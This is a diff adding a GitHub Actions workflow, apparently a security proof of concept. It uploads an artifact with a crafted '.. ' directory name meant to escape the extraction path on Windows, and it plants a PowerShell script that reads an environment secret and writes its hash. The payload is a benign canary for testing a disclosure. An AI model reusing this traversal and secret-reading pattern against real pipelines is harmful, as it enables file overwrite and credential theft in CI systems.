@@ -1,0 +1,49 @@
+name: GHBB artifact Windows normalization producer
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: Build harmless normalization canary artifact
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          root='ghbb-artifact-root'
+          crafted="$root/.. /victim"
+          mkdir -p "$crafted"
+          cat > "$crafted/trusted-consumer.ps1" <<'POWERSHELL'
+          $ErrorActionPreference = 'Stop'
+          $marker = 'GHBB-DOWNLOAD-ARTIFACT-WINDOWS-NORMALIZATION-20260726'
+          $secret = [Environment]::GetEnvironmentVariable('GHBB_DUMMY_SECRET')
+          $sha = [System.BitConverter]::ToString(
+            [System.Security.Cryptography.SHA256]::Create().ComputeHash(
+              [System.Text.Encoding]::UTF8.GetBytes($secret)
+            )
+          ).Replace('-', '').ToLowerInvariant()
+          @(
+            "marker=$marker"
+            "dummy_secret_sha256=$sha"
+            'source=untrusted-artifact'
+          ) | Set-Content -Path (Join-Path $env:RUNNER_TEMP 'ghbb-download-artifact-proof.txt') -Encoding utf8
+          POWERSHELL
+          printf 'producer_run=%s\n' "$GITHUB_RUN_ID" > "$root/producer-context.txt"
+          printf 'Created artifact entries:\n'
+          find "$root" -printf '%P\n' | sed -n '1,20p'
+
+      - name: Upload harmless normalization canary
+        uses: actions/upload-artifact@v7
+        with:
+          name: ghbb-win-normalization-${{ github.run_id }}
+          path: ghbb-artifact-root/
+          retention-days: 1
+          if-no-files-found: error
